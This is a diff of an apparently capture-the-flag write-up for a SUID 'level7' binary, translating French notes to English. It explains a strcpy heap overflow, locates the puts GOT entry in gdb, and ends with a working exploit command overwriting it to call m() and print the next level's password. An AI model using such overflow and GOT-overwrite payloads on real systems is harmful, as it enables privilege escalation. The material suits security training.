@@ -1,24 +1,19 @@
-# Level7 – Heap Overflow & GOT Overwrite
+# Level7
 
 ## 1. Context
-
-Le binaire level7 est un exécutable SUID appartenant à level8.
-
-## 1. Identity
 
 ```bash
 $ id
 uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
 
-$ ls -l level7
+$ ls -la
+[...]
 -rwsr-s---+ 1 level8 users 5648 Mar 9 2016 level7
+[...]
 ```
-
-Objectif : **exécuter du code avec les droits de `level8` afin de lire le fichier `.pass`.**
 
 ## 2. Program behavior
 
-**Basic execution**
 ```bash
 $ ./level7
 Segmentation fault
@@ -28,17 +23,17 @@ $ ./level7 test test
 ~~
 ```
 
-Le programme nécessite **deux arguments** pour fonctionner sans crash.
+The program needs two arguments. Otherwise it will crash.
 
-## 3. Code analysis (overview)
+## 3. Code overview
 
-Le programme :
-- alloue deux structures sur le heap
-- copie les arguments avec strcpy (sans vérification de taille)
-- lit le fichier /home/user/level8/.pass dans une variable globale c
-- appelle puts("~~")
+The `main()` function:
+- allocates two buffers on the heap
+- copies the arguments with strcpy (without checking the size)
+- reads the file `/home/user/level8/.pass` in a global var `c`
+- calls puts("~~")
 
-Une fonction non appelée existe :
+An uncalled `m()` function :
 ```c
 void m(void)
 {
@@ -46,66 +41,81 @@ void m(void)
 }
 ```
 
-`m()` affiche le contenu de la variable globale `c`, qui contient le flag.
+`m()` prints the content of `c`, containing the flag.
 
-## 4. Vulnerability
+## 4. Exploit
 
-**Heap overflow**
+We need to modify `puts()` to call `m()` instead.
 
-Chaque structure contient :
-- un entier
-- un pointeur vers un buffer de **8 octets**
+For that we need to use the vulnerability located here :
 ```c
-strcpy(obj1->buf, argv[1]);
-strcpy(obj2->buf, argv[2]);
+strcpy((char *)a[1], argv[1]);
+strcpy((char *)b[1], argv[2]);
 ```
 
-- `strcpy` ne vérifie pas la taille
-- un argument > 8 octets provoque un **heap overflow**
+Both buffers are allocated with `malloc(8)`, but `strcpy()` does not check the size of the input.
+This allows a **heap overflow** : by providing a long first argument, we can overwrite adjacent heap data, including the pointer used as the destination for the second `strcpy()`.
 
-## 5. Exploit strategy
+So we can control **where the second** `strcpy()` **writes**.
 
-Le heap ressemble à ceci :
-```
-[obj1][obj1->buf][obj2][obj2->buf]
-```
+To achieve this, we overwrite the GOT (Global Offset Table) entry of puts().
 
-En débordant `obj1->buf`, on peut **écraser le pointeur** `obj2->buf`.
+**Quick explain :**
+- PLT (Procedure Linkage Table) = unmodifiable code
+- GOT (Global Offset Table) = table of pointers modifiable
+We can overwrite a pointer to redirect the exec.
 
-Printf the time and a global variable "0x8049960", the name is "c"
-
-fgets put the result of the fopen on a global string "c", the same of the printf
-
-We need to read this global variable by calling the function m
-
-We can overwrite the puts call by "m" in the GOT using the strcpy overflow
-
-Get the address of puts in the GOT :
+Using gdb :
 ```bash
-(gdb)
+(gdb) disas main
+[...]
+0x080485f7 <+214>:   call   0x8048400 <puts@plt>
+[...]
 
+(gdb) info function puts
+[...]
+0x08048400  puts@plt
+[...]
+
+(gdb) disass 0x08048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928      <---- Found it !!
+   0x08048406 <+6>:     push   $0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+End of assembler dump.
 ```
 
+We have to overwrite this specific adress with the adress of `m()`.
 
-Let's test our code with a huge input :
+Address of `m()` :
 ```bash
-$ gdb level6
-
-(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
-Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
-
-Program received signal SIGSEGV, Segmentation fault.
-0x53535353 in ?? ()
-(gdb) info register eip
-eip            0x53535353       0x53535353
+(gdb) info function m
+[...]
+0x080484f4  m
+[...]
 ```
 
-53 = S => offset = 72
+By overflowing the first `strcpy()` and using patterns, we find that:
 
-The offset of the overflow is 72
+After **20 bytes**, we overwrite the pointer used as destination for the second `strcpy()`.
 
+So our first argument will be:
+```bash
+"A" * 20 + "\x28\x99\x04\x08"  <---- puts@got
+```
 
-## 4. Getting the flag
+Now everything is ready.
+
+argv[1] -> overwrites the destination of the second strcpy()
+
+argv[2] -> will be written at puts@got
+
+So as a second argument, we will have :
+```bash
+"\xf4\x84\x04\x08" <---- m
+```
+
+## 5. Getting the flag
 
 ```bash
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
